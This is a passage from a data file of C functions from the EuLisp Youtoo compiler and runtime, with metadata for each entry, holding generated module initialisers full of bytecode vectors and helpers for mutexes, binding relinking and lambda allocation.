"Youtoo\\Telos\\u2\\boot0.c", "repo_name": "Henry/EuLisp", "stars": 58, "license": "gpl-2.0", "language": "c", "size": 43462}
{"docstring": "/* Initialize module mop-gf */\n", "func_signal": "void initialize_module_mop_gf()", "code": "{\n  if (is_initialized) return;\n  initialize_module_boot();\n  initialize_module_mop_prim();\n  initialize_module_mop_class();\n  initialize_module_mop_inspect();\n  eul_fast_table_set(eul_modules,\"mop_gf\",(LispRef) mop_gf_bindings);\n  is_initialized = 1;\n  {\n  /* Declarations */\n  LispRef sym_1933, sym_1932, sym_1931, sym_1930, sym_1929, sym_1928, sym_1927, sym_1926, sym_1925, sym_1924, sym_1923, sym_1922, sym_1921, G001920, key_1918, key_1917, key_1916, key_1915, G001914, G001911, G001909, G001907, G001905, G001903, G001901, G001899, G001897, G001895, G001893, G001891, G001889, G001887, G001885, sym_1883, G001882, G001880, sym_1878, G001877, G001875, sym_1873, G001872, G001870, G001868, sym_1866, sym_1865, sym_1864, sym_1863, sym_1862, G001861, G001856, G001852;\n\n  /* Code vector and literal definitions */\n  eul_allocate_static_string(str_1853, \"*** WARNING [level-1]: \", 23);\n  eul_allocate_static_string(str_1854, \"\\n\", 1);\n  /* Byte-vector with size: 15 is_init: 0 index: 19 binding: warning */\n  static const void *G001851[] = {I(a7,84,23,00),B(mop_gf ,17),I(24,00,00,00),B(boot1 ,48),I(3c,02,2a,24),B(boot1 ,48),I(84,1f,03,1f),I(03,24,00,00),B(boot ,5),I(3c,04,2a,84),I(23,00,00,00),B(mop_gf ,18),I(24,00,00,00),B(boot1 ,48),I(3d,02,02,00)};\n\n  eul_allocate_static_string(str_1857, \"*** ERROR [level-1]: \", 21);\n  eul_allocate_static_string(str_1858, \"\\n\", 1);\n  eul_allocate_static_string(str_1859, \"***    See Backtrace? (y/n) \", 28);\n  /* Byte-vector with size: 29 is_init: 0 index: 23 binding: error */\n  static const void *G001855[] = {I(43,fd,84,23),B(mop_gf ,20),I(24,00,00,00),B(boot1 ,48),I(3c,02,2a,24),B(boot1 ,48),I(84,1f,03,1f),I(03,24,00,00),B(boot ,5),I(3c,04,2a,84),I(23,00,00,00),B(mop_gf ,21),I(24,00,00,00),B(boot1 ,48),I(3c,02,2a,84),I(23,00,00,00),B(mop_gf ,22),I(24,00,00,00),B(boot1 ,48),I(3c,02,2a,41),B(boot ,35),I(27,79,50,1b),I(44,0b,24,00),B(boot ,9),I(3c,00,36,02),I(86,2a,24,00),B(boot1 ,20),I(3d,00,04,45),I(04,00,00,00)};\n\n  /* Byte-vector with size: 86 is_init: 0 index: 29 binding: top-level */\n  static const void *G001860[] = {I(a9,84,24,00),B(mop_class ,22),I(24,00,00,00),B(mop_class ,22),I(24,00,00,00),B(boot1 ,40),I(3c,03,24,00),B(boot1 ,26),I(3c,00,24,00),B(boot1 ,26),I(3c,00,23,00),B(mop_gf ,24),I(1f,03,24,00),B(mop_class ,16),I(24,00,00,00),B(mop_class ,63),I(1f,05,1f,05),I(24,00,00,00),B(mop_gf ,16),I(3c,06,1b,89),B(mop_gf ,12),I(2a,83,24,00),B(mop_class ,22),I(24,00,00,00),B(boot1 ,40),I(3c,02,24,00),B(boot1 ,26),I(3c,00,24,00),B(boot1 ,26),I(3c,00,23,00),B(mop_gf ,25),I(1f,03,24,00),B(mop_class ,16),I(24,00,00,00),B(mop_class ,63),I(1f,05,1f,05),I(24,00,00,00),B(mop_gf ,16),I(3c,06,1b,89),B(mop_gf ,14),I(2a,84,24,00),B(mop_class ,86),I(24,00,00,00),B(mop_class ,22),I(24,00,00,00),B(boot1 ,40),I(3c,03,24,00),B(boot1 ,26),I(3c,00,24,00),B(boot1 ,26),I(3c,00,23,00),B(mop_gf ,26),I(1f,03,24,00),B(mop_class ,16),I(24,00,00,00),B(mop_class ,63),I(1f,05,1f,05),I(24,00,00,00),B(mop_gf ,16),I(3c,06,1b,89),B(mop_gf ,8),I(2a,24,00,00),B(mop_gf ,12),I(2a,8a,22,24),B(boot1 ,40),I(3c,01,24,00),B(mop_gf ,12),I(1c,1c,8a,08),I(1d,03,22,02),I(2a,24,00,00),B(mop_gf ,14),I(2a,24,00,00),B(mop_gf ,8),I(2a,23,00,00),B(mop_gf ,27),I(23,00,00,00),B(mop_gf ,23),I(3b,fd,89,00),B(boot ,14),I(2a,23,00,00),B(mop_gf ,28),I(23,00,00,00),B(mop_gf ,19),I(3b,fe,89,00),B(boot ,3),I(45,0d,00,00)};\n\n  /* Byte-vector with size: 7 is_init: 0 index: 30 binding: make */\n  static const void *G001867[] = {I(a7,1c,1c,24),B(mop_gf ,8),I(3c,02,1b,1d),I(24,00,00,00),B(mop_gf ,12),I(3d,02,03,45),I(03,00,00,00)};\n\n  /* Byte-vector with size: 8 is_init: 0 index: 31 binding: anonymous */\n  static const void *G001869[] = {I(aa,1b,47,00),I(01,1a,1b,44),I(13,47,00,03),I(1d,86,03,2a),I(1c,83,14,47),I(00,00,3d,01),I(02,36,04,47),I(00,03,45,02)};\n\n  /* Byte-vector with size: 16 is_init: 0 index: 33 binding: gf-reset-cache */\n  static const void *G001871[] = {I(aa,46,04,8a),I(08,02,1b,48),I(00,03,47,00),I(03,44,2e,47),I(00,03,06,1b),I(48,00,01,86),I(1b,48,00,00),I(23,00,00,00),B(mop_gf ,32),I(23,00,00,00),B(mop_gf ,31),I(3b,01,48,00),I(00,82,47,00),I(00,3d,01,03),I(22,02,36,02),I(86,45,01,00)};\n\n  /* Byte-vector with size: 26 is_init: 0 index: 34 binding: primitive-discriminating-function */\n  static const void *G001874[] = {I(a8,47,00,00),I(8a,08,02,1b),I(82,02,1c,83),I(02,47,00,00),I(8a,06,02,1b),I(1f,05,24,00),B(boot ,5),I(3c,02,24,00),B(mop_class ,87),I(1c,24,00,00),B(boot ,11),I(3c,02,1b,12),I(1b,44,13,47),I(00,00,1f,08),I(24,00,00,00),B(mop_gf ,15),I(3d,02,08,36),I(21,1f,05,1d),I(0f,1f,07,1f),I(06,1d,03,2a),I(1d,11,29,18),I(1d,10,1b,1f),I(0a,24,00,00),B(boot ,5),I(3d,02,0a,22),I(02,45,08,00)};\n\n  /* Byte-vector with size: 6 is_init: 0 index: 36 binding: compute-primitive-discriminating-function */\n  static const void *G001876[] = {I(aa,46,01,1b),I(48,00,00,23),B(mop_gf ,35),I(23,00,00,00),B(mop_gf ,34),I(3b,ff,45,01)};\n\n  /* Byte-vector with size: 5 is_init: 0 index: 37 binding: primitive-method-lookup-function */\n  static const void *G001879[] = {I(a8,47,00,01),I(1c,47,00,00),I(24,00,00,00),B(mop_gf ,7),I(3d,03,01,00)};\n\n  /* Byte-vector with size: 29 is_init: 0 index: 39 binding: primitive-make-generic-function */\n  static const void *G001881[] = {I(ab,46,02,1b),I(48,00,00,24),B(mop_class ,16),I(8a,09,01,1b),I(48,00,01,47),I(00,01,1f,03),I(1c,82,1d,03),I(22,02,2a,47),I(00,01,47,00),I(00,1c,83,1d),I(03,22,02,2a),I(47,00,01,24),B(mop_class ,63),I(1c,8a,03,1d),I(03,22,02,2a),I(47,00,01,23),B(mop_gf ,38),I(23,00,00,00),B(mop_gf ,37),I(3b,ff,1c,8a),I(06,1d,03,22),I(02,2a,47,00),I(01,24,00,00),B(mop_gf ,4),I(3c,01,47,00),I(01,1c,1c,8a),I(07,1d,03,22),I(02,2a,47,00),I(01,45,04,00)};\n\n  /* Byte-vector with size: 18 is_init: 0 index: 40 binding: anonymous */\n  static const void *G001884[] = {I(43,03,1c,12),I(1b,44,0f,1c),I(24,00,00,00),B(boot ,28),I(3d,01,04,36),I(32,1d,10,1b),I(44,1f,1f,04),I(11,1f,04,11),I(1f,06,10,1b),I(04,1b,1f,07),I(0f,1f,04,1f),I(04,1d,47,00),I(00,3d,03,0a),I(22,05,36,0d),I(1f,04,11,1f),I(04,11,47,00),I(00,3d,02,05),I(22,01,45,04)};\n\n  /* Byte-vector with size: 10 is_init: 0 index: 41 binding: discriminating-domain */\n  static const void *G001886[] = {I(ab,46,01,86),I(1b,48,00,00),I(23,00,00,00),B(mop_gf ,32),I(23,00,00,00),B(mop_gf ,40),I(3b,03,48,00),I(00,1d,1d,86),I(47,00,00,3d),I(03,03,45,03)};\n\n  /* Byte-vector with size: 7 is_init: 0 index: 42 binding: anonymous */\n  static const void *G001888[] = {I(ab,1c,83,02),I(1c,83,02,1c),I(1c,47,00,00),I(24,00,00,00),B(mop_gf ,13),I(3d,03,04,45),I(04,00,00,00)};\n\n  /* Byte-vector with size: 15 is_init: 0 index: 43 binding: the-method-lookup-function */\n  static const void *G001890[] = {I(43,03,46,01),I(1d,8a,08,02),I(82,02,1b,48),I(00,00,1f,03),I(8a,05,02,47),I(00,00,1c,24),B(mop_gf ,9),I(3c,02,1b,23),B(mop_gf ,32),I(23,00,00,00),B(mop_gf ,42),I(3b,02,24,00),B(boot ,16),I(3d,02,06,45),I(06,00,00,00)};\n\n  /* Byte-vector with size: 16 is_init: 0 index: 44 binding: anonymous */\n  static const void *G001892[] = {I(ab,1c,12,1b),I(44,04,1c,36),I(35,1d,10,1b),I(83,02,47,00),I(00,1c,24,00),B(mop_gf ,11),I(3c,02,1b,44),I(11,1f,05,11),I(1f,03,1f,06),I(0f,47,00,01),I(3d,02,06,36),I(0f,1f,05,11),I(1b,1f,06,47),I(00,01,3d,02),I(07,22,01,22),I(03,45,03,00)};\n\n  /* Byte-vector with size: 11 is_init: 0 index: 45 binding: select-methods */\n  static const void *G001894[] = {I(ab,46,02,1c),I(48,00,00,86),I(1b,48,00,01),I(23,00,00,00),B(mop_gf ,32),I(23,00,00,00),B(mop_gf ,44),I(3b,02,48,00),I(01,1c,86,47),I(00,01,3d,02),I(03,45,03,00)};\n\n  /* Byte-vector with size: 11 is_init: 0 index: 46 binding: anonymous */\n  static const void *G001896[] = {I(aa,1b,47,00),I(03,1a,1b,44),I(20,47,00,00),I(1d,02,47,00),I(01,1f,03,02),I(50,1b,44,0c),I(1d,83,14,47),I(00,02,3d,01),I(03,36,02,86),I(22,01,36,02),I(87,45,02,00)};\n\n  /* Byte-vector with size: 14 is_init: 0 index: 47 binding: sig= */\n  static const void *G001898[] = {I(ab,46,05,1c),I(48,00,00,1b),I(48,00,01,47),I(00,00,06,1b),I(48,00,03,86),I(1b,48,00,02),I(23,00,00,00),B(mop_gf ,32),I(23,00,00,00),B(mop_gf ,46),I(3b,01,48,00),I(02,82,47,00),I(02,3d,01,04),I(45,04,00,00)};\n\n  /* Byte-vector with size: 18 is_init: 0 index: 48 binding: anonymous */\n  static const void *G001900[] = {I(aa,1b,47,00),I(03,1a,1b,44),I(3b,47,00,01),I(1d,02,1b,44),I(26,47,00,00),I(1f,03,02,1b),I(1d,24,00,00),B(mop_inspect ,11),I(3c,02,1b,44),I(0d,1f,04,83),I(14,47,00,02),I(3d,01,05,36),I(02,86,22,02),I(36,0a,1d,83),I(14,47,00,02),I(3d,01,03,22),I(01,36,02,87),I(45,02,00,00)};\n\n  /* Byte-vector with size: 14 is_init: 0 index: 49 binding: sig-applicable? */\n  static const void *G001902[] = {I(ab,46,05,1c),I(48,00,00,1b),I(48,00,01,47),I(00,01,06,1b),I(48,00,03,86),I(1b,48,00,02),I(23,00,00,00),B(mop_gf ,32),I(23,00,00,00),B(mop_gf ,48),I(3b,01,48,00),I(02,82,47,00),I(02,3c,01,1b),I(45,05,00,00)};\n\n  /* Byte-vector with size: 10 is_init: 0 index: 50 binding: anonymous */\n  static const void *G001904[] = {I(aa,1b,10,47),I(00,00,1c,50),I(1b,44,04,87),I(36,17,47,00),I(01,1d,50,1b),I(44,04,86,36),I(0a,1f,03,11),I(47,00,02,3d),I(01,04,22,01),I(45,03,00,00)};\n\n  /* Byte-vector with size: 26 is_init: 0 index: 51 binding: anonymous */\n  static const void *G001906[] = {I(aa,46,03,1b),I(47,01,04,1a),I(1b,44,59,47),I(01,00,1d,02),I(47,01,01,1f),I(03,02,1c,48),I(00,00,1b,48),I(00,01,47,00),I(00,47,00,01),I(50,1b,44,0d),I(1f,04,83,14),I(47,01,03,3d),I(01,05,36,2c),I(86,1b,48,00),I(02,23,00,00),B(mop_gf ,32),I(23,00,00,00),B(mop_gf ,50),I(3b,01,48,00),I(02,47,01,02),I(1f,06,02,1b),I(8a,06,02,47),I(00,02,3d,01),I(07,22,02,22),I(03,36,02,87),I(45,02,00,00)};\n\n  /* Byte-vector with size: 15 is_init: 0 index: 52 binding: sig<= */\n  static const void *G001908[] = {I(43,03,46,06),I(1d,48,00,00),I(1c,48,00,01),I(1b,48,00,02),I(47,00,00,06),I(1b,48,00,04),I(86,1b,48,00),I(03,23,00,00),B(mop_gf ,32),I(23,00,00,00),B(mop_gf ,51),I(3b,01,48,00),I(03,82,47,00),I(03,3d,01,05),I(45,05,00,00)};\n\n  eul_allocate_static_string(str_1912, \"no applicable methods for ~a\\n    arguments: ~a\\n    classes: ~a\", 62);\n  /* Byte-vector with size: 12 is_init: 0 index: 54 binding: error-no-applicable-methods */\n  static const void *G001910[] = {I(ab,1c,82,02),I(24,00,00,00),B(mop_inspect ,5),I(1d,24,00,00),B(boot ,11),I(3c,02,86,23),B(mop_gf ,53),I(1f,03,1f,05),I(1f,04,24,00),B(boot ,13),I(3d,05,04,45),I(04,00,00,00)};\n\n  /* Byte-vector with size: 32 is_init: 0 index: 59 binding: make-generic-function */\n  static const void *G001913[] = {I(43,06,1f,03),I(24,00,00,00),B(mop_class ,16),I(50,1b,44,22),I(1f,03,24,00),B(mop_class ,63),I(50,1b,44,11),I(1f,03,12,1b),I(44,06,1f,03),I(12,36,02,86),I(22,01,36,02),I(86,22,01,36),I(02,86,1b,44),I(11,1f,07,1f),I(07,24,00,00),B(mop_gf ,5),I(3d,02,08,36),I(37,24,00,00),B(mop_gf ,2),I(1f,06,23,00),B(mop_gf ,55),I(1f,0a,23,00),B(mop_gf ,56),I(1f,0b,23,00),B(mop_gf ,57),I(1f,0b,23,00),B(mop_gf ,58),I(1f,0c,1f,0c),I(24,00,00,00),B(boot ,5),I(3d,0b,08,45),I(08,00,00,00)};\n\n  /* Byte-vector with size: 106 is_init: 1 index: 0 binding: initialize-mop-gf */\n  static const void *G001919[] = {I(87,25,00,00),B(mop_gf ,1),I(24,00,00,00),B(mop_inspect ,1),I(3e,0b,24,00),B(mop_inspect ,0),I(3c,00,21,01),I(24,00,00,00),B(mop_class ,1),I(3e,0b,24,00),B(mop_class ,0),I(3c,00,21,01),I(24,00,00,00),B(mop_prim ,1),I(3e,0b,24,00),B(mop_prim ,0),I(3c,00,21,01),I(24,00,00,00),B(boot ,1),I(3e,0b,24,00),B(boot ,0),I(3c,00,21,01),I(23,00,00,00),B(mop_gf ,60),I(23,00,00,00),B(mop_gf ,59),I(3b,06,25,00),B(mop_gf ,16),I(23,00,00,00),B(mop_gf ,61),I(23,00,00,00),B(mop_gf ,54),I(3b,02,25,00),B(mop_gf ,15),I(86,25,00,00),B(mop_gf ,14),I(23,00,00,00),B(mop_gf ,62),I(23,00,00,00),B(mop_gf ,52),I(3b,03,25,00),B(mop_gf ,13),I(86,25,00,00),B(mop_gf ,12),I(23,00,00,00),B(mop_gf ,63),I(23,00,00,00),B(mop_gf ,49),I(3b,02,25,00),B(mop_gf ,11),I(23,00,00,00),B(mop_gf ,64),I(23,00,00,00),B(mop_gf ,47),I(3b,02,25,00),B(mop_gf ,10),I(23,00,00,00),B(mop_gf ,65),I(23,00,00,00),B(mop_gf ,45),I(3b,02,25,00),B(mop_gf ,9),I(86,25,00,00),B(mop_gf ,8),I(23,00,00,00),B(mop_gf ,66),I(23,00,00,00),B(mop_gf ,43),I(3b,03,25,00),B(mop_gf ,7),I(23,00,00,00),B(mop_gf ,67),I(23,00,00,00),B(mop_gf ,41),I(3b,02,25,00),B(mop_gf ,6),I(23,00,00,00),B(mop_gf ,68),I(23,00,00,00),B(mop_gf ,39),I(3b,02,25,00),B(mop_gf ,5),I(23,00,00,00),B(mop_gf ,69),I(23,00,00,00),B(mop_gf ,36),I(3b,01,25,00),B(mop_gf ,4),I(23,00,00,00),B(mop_gf ,70),I(23,00,00,00),B(mop_gf ,33),I(3b,01,25,00),B(mop_gf ,3),I(23,00,00,00),B(mop_gf ,71),I(23,00,00,00),B(mop_gf ,30),I(3b,fe,25,00),B(mop_gf ,2),I(23,00,00,00),B(mop_gf ,72),I(23,00,00,00),B(mop_gf ,29),I(3b,00,3d,00),I(00,ac,00,00)};\n\n\n  /* Initializations */\n  object_class(str_1853) = eul_static_string_class;\n  object_class(str_1854) = eul_static_string_class;\n  eul_allocate_bytevector( G001852,G001851);\n  object_class(str_1857) = eul_static_string_class;\n  object_class(str_1858) = eul_static_string_class;\n  object_class(str_1859) = eul_static_string_class;\n  eul_allocate_bytevector( G001856,G001855);\n  eul_intern_symbol(sym_1862,\"initialize\");\n  eul_intern_symbol(sym_1863,\"finalize\");\n  eul_intern_symbol(sym_1864,\"allocate\");\n  eul_intern_symbol(sym_1865,\"error\");\n  eul_intern_symbol(sym_1866,\"warning\");\n  eul_allocate_bytevector( G001861,G001860);\n  eul_allocate_bytevector( G001868,G001867);\n  eul_allocate_bytevector( G001870,G001869);\n  eul_intern_symbol(sym_1873,\"anonymous\");\n  eul_allocate_bytevector( G001872,G001871);\n  eul_allocate_bytevector( G001875,G001874);\n  eul_intern_symbol(sym_1878,\"primitive-discriminating-function\");\n  eul_allocate_bytevector( G001877,G001876);\n  eul_allocate_bytevector( G001880,G001879);\n  eul_intern_symbol(sym_1883,\"primitive-method-lookup-function\");\n  eul_allocate_bytevector( G001882,G001881);\n  eul_allocate_bytevector( G001885,G001884);\n  eul_allocate_bytevector( G001887,G001886);\n  eul_allocate_bytevector( G001889,G001888);\n  eul_allocate_bytevector( G001891,G001890);\n  eul_allocate_bytevector( G001893,G001892);\n  eul_allocate_bytevector( G001895,G001894);\n  eul_allocate_bytevector( G001897,G001896);\n  eul_allocate_bytevector( G001899,G001898);\n  eul_allocate_bytevector( G001901,G001900);\n  eul_allocate_bytevector( G001903,G001902);\n  eul_allocate_bytevector( G001905,G001904);\n  eul_allocate_bytevector( G001907,G001906);\n  eul_allocate_bytevector( G001909,G001908);\n  object_class(str_1912) = eul_static_string_class;\n  eul_allocate_bytevector( G001911,G001910);\n  eul_intern_keyword(key_1915,\"name\");\n  eul_intern_keyword(key_1916,\"domain\");\n  eul_intern_keyword(key_1917,\"method-class\");\n  eul_intern_keyword(key_1918,\"method-keywords\");\n  eul_allocate_bytevector( G001914,G001913);\n  eul_intern_symbol(sym_1921,\"make-generic-function\");\n  eul_intern_symbol(sym_1922,\"error-no-applicable-methods\");\n  eul_intern_symbol(sym_1923,\"sig<=\");\n  eul_intern_symbol(sym_1924,\"sig-applicable?\");\n  eul_intern_symbol(sym_1925,\"sig=\");\n  eul_intern_symbol(sym_1926,\"select-methods\");\n  eul_intern_symbol(sym_1927,\"the-method-lookup-function\");\n  eul_intern_symbol(sym_1928,\"discriminating-domain\");\n  eul_intern_symbol(sym_1929,\"primitive-make-generic-function\");\n  eul_intern_symbol(sym_1930,\"compute-primitive-discriminating-function\");\n  eul_intern_symbol(sym_1931,\"gf-reset-cache\");\n  eul_intern_symbol(sym_1932,\"make\");\n  eul_intern_symbol(sym_1933,\"top-level\");\n  eul_allocate_bytevector( G001920,G001919);\n\n  /* Set local bindings */\n  {\n    int i;\n    for (i = 2; i < 17; i++)\n      mop_gf_bindings[i] = eul_nil;\n  }\n\n  mop_gf_bindings[ 17] = str_1853;\n  mop_gf_bindings[ 18] = str_1854;\n  mop_gf_bindings[ 19] = G001852;\n  mop_gf_bindings[ 20] = str_1857;\n  mop_gf_bindings[ 21] = str_1858;\n  mop_gf_bindings[ 22] = str_1859;\n  mop_gf_bindings[ 23] = G001856;\n  mop_gf_bindings[ 24] = sym_1862;\n  mop_gf_bindings[ 25] = sym_1863;\n  mop_gf_bindings[ 26] = sym_1864;\n  mop_gf_bindings[ 27] = sym_1865;\n  mop_gf_bindings[ 28] = sym_1866;\n  mop_gf_bindings[ 29] = G001861;\n  mop_gf_bindings[ 30] = G001868;\n  mop_gf_bindings[ 31] = G001870;\n  mop_gf_bindings[ 32] = sym_1873;\n  mop_gf_bindings[ 33] = G001872;\n  mop_gf_bindings[ 34] = G001875;\n  mop_gf_bindings[ 35] = sym_1878;\n  mop_gf_bindings[ 36] = G001877;\n  mop_gf_bindings[ 37] = G001880;\n  mop_gf_bindings[ 38] = sym_1883;\n  mop_gf_bindings[ 39] = G001882;\n  mop_gf_bindings[ 40] = G001885;\n  mop_gf_bindings[ 41] = G001887;\n  mop_gf_bindings[ 42] = G001889;\n  mop_gf_bindings[ 43] = G001891;\n  mop_gf_bindings[ 44] = G001893;\n  mop_gf_bindings[ 45] = G001895;\n  mop_gf_bindings[ 46] = G001897;\n  mop_gf_bindings[ 47] = G001899;\n  mop_gf_bindings[ 48] = G001901;\n  mop_gf_bindings[ 49] = G001903;\n  mop_gf_bindings[ 50] = G001905;\n  mop_gf_bindings[ 51] = G001907;\n  mop_gf_bindings[ 52] = G001909;\n  mop_gf_bindings[ 53] = str_1912;\n  mop_gf_bindings[ 54] = G001911;\n  mop_gf_bindings[ 55] = key_1915;\n  mop_gf_bindings[ 56] = key_1916;\n  mop_gf_bindings[ 57] = key_1917;\n  mop_gf_bindings[ 58] = key_1918;\n  mop_gf_bindings[ 59] = G001914;\n  mop_gf_bindings[ 1] = eul_nil;\n  mop_gf_bindings[ 60] = sym_1921;\n  mop_gf_bindings[ 61] = sym_1922;\n  mop_gf_bindings[ 62] = sym_1923;\n  mop_gf_bindings[ 63] = sym_1924;\n  mop_gf_bindings[ 64] = sym_1925;\n  mop_gf_bindings[ 65] = sym_1926;\n  mop_gf_bindings[ 66] = sym_1927;\n  mop_gf_bindings[ 67] = sym_1928;\n  mop_gf_bindings[ 68] = sym_1929;\n  mop_gf_bindings[ 69] = sym_1930;\n  mop_gf_bindings[ 70] = sym_1931;\n  mop_gf_bindings[ 71] = sym_1932;\n  mop_gf_bindings[ 72] = sym_1933;\n  eul_allocate_lambda( mop_gf_bindings[0], \"initialize-mop-gf\", 0, G001920);\n\n  }\n}", "path": "Youtoo\\Telos\\u2\\mop-gf.c", "repo_name": "Henry/EuLisp", "stars": 58, "license": "gpl-2.0", "language": "c", "size": 43462}
{"docstring": "///-----------------------------------------------------------------------------\n/// eul_lock_create()\n/// Description: create a UI mutex\n/// Args: none\n/// Returns: lock handler or eul_nil on failure\n///-----------------------------------------------------------------------------\n", "func_signal": "LispRef eul_lock_create()", "code": "{\n  pthread_mutex_t *mt;\n\n  mt = (pthread_mutex_t *) gc_malloc(sizeof(pthread_mutex_t));\n\n  /* Initialise a new mutex */\n  if(pthread_mutex_init(mt, NULL) == 0)\n    return (LispRef) mt;\n  else\n    return eul_nil;\n}", "path": "Modules\\Fthread\\MIT\\eul-lock.c", "repo_name": "Henry/EuLisp", "stars": 58, "license": "gpl-2.0", "language": "c", "size": 43462}
{"docstring": "///-----------------------------------------------------------------------------\n/// Relink the binding references of bytevectors\n///-----------------------------------------------------------------------------\n", "func_signal": "LispRef eul_link_raw_bytevector_refs(Instruction *code, int n, LispRef refs)", "code": "{\n    Instruction *pc = code;\n\n    while (1)\n    {\n        if (pc < (code + n))\n        {\n            Instruction instr = *pc;\n\n            WITH_DEBUG(fprintf(stderr, \">>instr: %i (%x)\\n\", instr, instr));\n\n            WITH_DEBUG\n            (\n                fprintf\n                (\n                    stderr,\n                    \"pc: %\"ptrIntPM\"i (%\"ptrIntPM\"x)\\n\",\n                    (ptrInt)pc,\n                    (ptrInt)pc\n                )\n            );\n\n            int inlined_arg_size = eul_instr_inlined_arg_size(instr);\n\n            WITH_DEBUG\n            (\n                fprintf\n                (\n                    stderr,\n                    \"inlined_arg_size: %i\\n\",\n                    inlined_arg_size\n                )\n            );\n\n            if (inlined_arg_size == 4)\n            {\n                align(code, pc);\n                switch (instr)\n                {\n                    case BC_STATIC_REF:\n                    case BC_BINDING_REF:\n                    case BC_SET_BINDING_REF:\n                    case BC_SET_AND_GET_BINDING_REF:\n                    {\n                        LispRef ref = eul_car(refs);\n                        WITH_DEBUG(fprintf(stderr, \"!!!Ref: \"));\n                        WITH_DEBUG(fprint_ref(stderr, ref));\n                        WITH_DEBUG(fprintf(stderr, \"\\n\"));\n                        if (ref == eul_nil)\n                        {\n                            // binding not valid\n                            return eul_nil;\n                        }\n                        LispRef obj = eul_slot_ref(ref, 0);\n                        char *module_name =\n                            eul_symbol_as_c_string(eul_slot_ref(ref, 1));\n                        int index = eul_fpi_as_c_int(eul_slot_ref(ref, 2));\n                        WITH_DEBUG\n                        (\n                            fprintf\n                            (\n                                stderr,\n                                \"!!!Link binding module: %s index: %d\\n\",\n                                module_name,\n                                index\n                            )\n                        );\n                        if (obj == eul_nil)\n                        {\n                            obj = eul_dyn_binding_ref(module_name, index);\n                        }\n                        WITH_DEBUG(fprintf(stderr, \"!!!Link binding obj: \"));\n                        WITH_DEBUG(fprint_ref(stderr, obj));\n                        WITH_DEBUG(fprintf(stderr, \"\\n\"));\n                        LispRef bindings =\n                            eul_fast_table_ref(eul_modules, module_name);\n                        LispRef* ptr = ((LispRef *) bindings) + index;\n                        binding_ref(pc) = ptr;\n                        refs = eul_cdr(refs);\n                    }\n                }\n            }\n            else\n            {\n                pc += inlined_arg_size;\n            }\n        }\n        else\n        {\n            break;\n        }\n\n        ++pc;\n    }\n    return eul_true;\n}", "path": "Modules\\OS\\eul-serial2.c", "repo_name": "Henry/EuLisp", "stars": 58, "license": "gpl-2.0", "language": "c", "size": 43462}
{"docstring": "///-----------------------------------------------------------------------------\n/// Allocate lambda object\n///-----------------------------------------------------------------------------\n", "func_signal": "LispRef eul_allocate_lambda2(LispRef name, LispRef arity, LispRef bv)", "code": "{\n    LispRef res;\n    eul_allocate_lambda1(res, name, arity, bv);\n\n    return res;\n}", "path": "Youtoo\\Comptime2\\Ff\\eul-dld.c", "repo_name": "Henry/EuLisp", "stars": 58, "license": "gpl-2.0", "language": "c", "size": 43462}
{"docstring": "///-----------------------------------------------------------------------------\n/// Write a binding reference into a bytevector\n///-----------------------------------------------------------------------------\n", "func_signal": "LispRef eul_write_next_bv_binding_ref1\n(\n    LispRef bv,\n    int bv_index,\n    char *module_name,\n    int local_index\n)", "code": "{\n    void **data = (void **)STRING_DATA(bv);\n\n    LispRef bindings = eul_fast_table_ref(eul_modules, module_name);\n\n    if (eul_null(bindings))\n    {\n        fprintf\n        (stderr,\n        \"\\n*** WARNING [eul-dld][eul_write_next_bv_binding_ref1]: module %s not loaded\\n\",\n        module_name);\n        fflush(stderr);\n    }\n    else\n    {\n        LispRef *word = ((LispRef *) bindings) + local_index;\n\n        data[bv_index / ptrNBytes] = (void *)word;\n    }\n\n    return eul_nil;\n}", "path": "Youtoo\\Comptime2\\Ff\\eul-dld.c", "repo_name": "Henry/EuLisp", "stars": 58, "license": "gpl-2.0", "language": "c", "size": 43462}
{"docstring": "/* Initialize module sx-node */\n", "func_signal": "void initialize_module_sx_node()", "code": "{\n  if (is_initialized) return;\n  initialize_module_i_all();\n  initialize_module_i_ffi();\n  initialize_module_sx_obj();\n  initialize_module_p_env();\n  eul_fast_table_set(eul_modules,\"sx_node\",(LispRef) sx_node_bindings);\n  is_initialized = 1;\n  {\n  /* Declarations */\n  LispRef sym_874, sym_873, sym_872, sym_871, sym_870, sym_869, sym_868, sym_867, sym_866, sym_865, sym_864, sym_863, sym_862, sym_861, sym_860, sym_859, sym_858, sym_857, sym_856, sym_855, sym_854, sym_853, sym_852, sym_851, sym_850, sym_849, G00848, G00846, G00844, G00842, G00840, G00838, G00836, G00834, G00832, G00830, G00828, G00826, G00824, G00820, sym_818, G00817, G00815, key_813, key_812, G00811, key_809, G00808, G00806, sym_804, G00803, sym_801, sym_800, sym_799, sym_798, sym_797, G00796, key_794, key_793, key_792, key_791, sym_790, G00789, G00787, G00785, sym_783, G00782, sym_780, sym_779, sym_778, G00776, key_774, key_773, key_772, key_771, key_770, G00769, sym_767, G00766, sym_764, sym_763, sym_762, sym_761, sym_760, G00759, G00757, G00755, sym_753, G00752, key_750, key_749, key_748, key_747, key_746, key_745, key_744, G00743;\n\n  /* Code vector and literal definitions */\n  /* Byte-vector with size: 39 is_init: 0 index: 36 binding: (method-clone-node) */\n  static const void *G00742[] = {I(aa,1b,04,1c),I(8a,06,24,00),B(sx_obj1 ,42),I(08,1d,8a,05),I(24,00,00,00),B(sx_obj1 ,42),I(08,1f,03,8a),I(04,24,00,00),B(sx_obj1 ,42),I(08,1f,04,8a),I(03,24,00,00),B(sx_obj1 ,42),I(08,1f,05,84),I(24,00,00,00),B(sx_obj1 ,42),I(08,1f,06,83),I(24,00,00,00),B(sx_obj1 ,42),I(08,1f,07,82),I(24,00,00,00),B(sx_obj1 ,42),I(08,1f,07,23),B(sx_node ,29),I(1f,08,23,00),B(sx_node ,30),I(1f,09,23,00),B(sx_node ,31),I(1f,0a,23,00),B(sx_node ,32),I(1f,0b,23,00),B(sx_node ,33),I(1f,0c,23,00),B(sx_node ,34),I(1f,0d,23,00),B(sx_node ,35),I(1f,0e,24,00),B(mop_gf ,2),I(3d,0f,09,45),I(09,00,00,00)};\n\n  /* Byte-vector with size: 17 is_init: 0 index: 38 binding: (method-get-named-encl-lambda) */\n  static const void *G00751[] = {I(aa,1b,34,00),I(00,00,00,3e),I(1b,8a,07,24),B(sx_obj ,17),I(08,23,00,00),B(sx_node ,37),I(50,1b,34,00),I(00,00,00,1e),I(1c,82,24,00),B(sx_obj1 ,3),I(08,24,00,00),B(i_param ,40),I(3d,01,02,32),I(00,00,00,06),I(1c,22,01,32),I(00,00,00,06),I(86,45,01,00)};\n\n  /* Byte-vector with size: 3 is_init: 0 index: 39 